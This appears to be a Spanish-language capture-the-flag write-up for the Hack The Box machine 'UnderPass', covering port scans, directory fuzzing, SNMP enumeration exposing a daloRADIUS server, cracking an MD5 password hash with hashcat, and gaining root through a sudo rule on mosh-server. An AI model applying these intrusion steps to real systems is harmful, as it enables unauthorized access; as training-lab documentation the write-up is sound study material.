---
tags:
title: UnderPass- Easy (HTB)
permalink: /UnderPass-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv 10.10.11.48
```

Donde los puertos abiertos son el puerto *22 y 80* por el protocolo tcp 

```bash 
nmap -sU 10.10.11.48 --top-port=100
```

Donde vemos el puerto *161* abierto por el protocolo **UDP**


Gobuster

```bash 
gobuster dir -u [URL] -w /usr/share/wordlist/dirb/common.txt -t 50
```
no hay respuestas 

FFuf 

```bash 
ffuf -u [URL] -w /usr/share/wordlists/dirb/subdomains-top1iml-20000.txt -H "Host: FUZZ.[hostname/ip]" -ac
```

---

SNMP Enumeration

```bash 
snmp-check 10.10.11.48
```

Donde podemos visualizar algo como esto 

```bash 
snmp-check 10.10.11.48 
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 02:50:29.71
  Uptime system                 : 02:50:19.22
  System date                   : 2025-5-14 22:26:34.0

```

Donde podemos ver que la pagina la esta corriendo un servidor el cual se llama daloRADIUS 

 http://underpass.htb/daloradius/ 


```bash 
curl  http://underpass.htb/daloradius/ 
```

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://underpass.htb/daloradius/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at underpass.htb Port 80</address>
</body></html>

---

```bash 
ffuf -u [URL]/daloradius/FUZZ -w /usr/share/wordlists/dirb/big.txt -recursion
```

daloRADIUS/app/operators.


donde en la pagina podemos visualizar al usuario *svcMosh* con su respectiva password en hash **MD5** , la cual la metemos en un archivo

```bash 
nvim hash.txt
```

y procedemos a crackearla mediante fuerza bruta con hashcat 

```bash 
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt #La cual nos da la siguiente clave : underwaterfriends
``` 


---

# Privilege escalation 

```bash
sudo -l 
```

donde vemos algo como esto:

```javascript
svcMosh@underpass:~$ sudo -l 
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

donde podemos entender que tenemos permisos de ejecucion en el siguiente binario el cual algo parecido a *SSH* el cual es mobile shell (*MOSH*)

donde ejecutandolo obtenemos el usuario **root**

```bash 
mosh --server="sudo /usr/bin/mosh-server" localhost
```

```bash 
cat root.txt
```

`~Happy Hacking.`

